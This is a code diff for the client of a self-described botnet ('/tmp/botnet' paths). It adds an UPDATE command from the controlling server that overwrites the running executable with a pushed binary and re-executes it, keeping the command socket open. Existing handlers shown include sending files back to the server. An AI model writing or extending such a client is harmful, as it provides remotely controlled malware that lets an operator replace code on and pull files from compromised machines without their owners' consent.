@@ -3,6 +3,10 @@
 #include <stdio.h>
 #include <string.h>
 #include <sys/stat.h> 
+#include <unistd.h>
+#include <limits.h>
+#include <errno.h>
+#include <stdarg.h>
 
 #include "../../include/client/client_utils.h"
 #include "../../include/logging.h"
@@ -125,7 +129,7 @@ int parse_and_execute_command(const Command cmd, int sockfd) {
     return exit_code;
 }
 
-void receive_and_process_message(int sockfd) {
+void receive_and_process_message(int sockfd, int argc, char *argv[]) {
     char buffer[1024];
 
     // Receive the message from the server
@@ -163,6 +167,9 @@ void receive_and_process_message(int sockfd) {
             output_log("Preparing for DOWNLOAD request\n", LOG_DEBUG, LOG_TO_CONSOLE);
             send_file(sockfd,cmd.params[0]);
             break;
+        case UPDATE:
+            perform_self_update("/tmp/botnet/downloads/client", sockfd, argc, argv);
+            break;
         case UNKNOWN:
             output_log("Unknown command type received\n", LOG_WARNING, LOG_TO_CONSOLE);
             break;
@@ -172,4 +179,57 @@ void receive_and_process_message(int sockfd) {
     return ;
 }
 
+void ensure_directory_exists(const char *filepath) {
 
+    struct stat st = {0};
+    if (stat(filepath, &st) == -1) {
+        mkdir("/tmp", 0755);  // Ensure tmp exists
+        mkdir("/tmp/botnet", 0755);  // Ensure botnet folder exists
+        mkdir("/tmp/botnet/downloads", 0755);  // Ensure downloads folder exists
+        mkdir(filepath, 0755);       // Create folder
+    }
+}
+
+void perform_self_update(const char *new_exe_path, int sockfd, int argc, char *argv[]) {
+    char exe_path[PATH_MAX];
+    ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
+    if (len == -1) {
+        output_log("perform_self_update : Attempt to read proc/self/exe failed\n", LOG_ERROR, LOG_TO_ALL);
+        perror("readlink failed");
+        return;
+    }
+    exe_path[len] = '\0';
+
+    // Move the new executable to the current executable's location
+    if (rename(new_exe_path, exe_path) != 0) {
+        output_log("perform_self_update : Override client executable failed\n", LOG_ERROR, LOG_TO_ALL);
+        perror("Override client executable failed");
+        return;
+    }
+
+    // Ensure the new executable has the correct permissions
+    if (chmod(exe_path, 0755) != 0) {
+        output_log("perform_self_update : Chmod failed on new executable\n", LOG_ERROR, LOG_TO_ALL);
+        perror("chmod failed");
+        return;
+    }
+
+    // Prepare arguments for execv
+    char fd_arg[32];
+    snprintf(fd_arg, sizeof(fd_arg), "--fd=%d", sockfd);
+
+    // +2 for exe_path and fd_arg, +1 for NULL
+    char **new_argv = malloc((argc + 2) * sizeof(char *));
+    new_argv[0] = exe_path;
+    new_argv[1] = fd_arg;
+    for (int i = 1; i < argc; ++i) {
+        new_argv[i + 1] = argv[i];
+    }
+    new_argv[argc + 1] = NULL;
+
+    execv(exe_path, new_argv);
+
+    // If execv fails
+    perror("execv failed");
+    output_log("perform_self_update : Execv failed to run : %s\n", LOG_ERROR, LOG_TO_ALL, errno);
+}
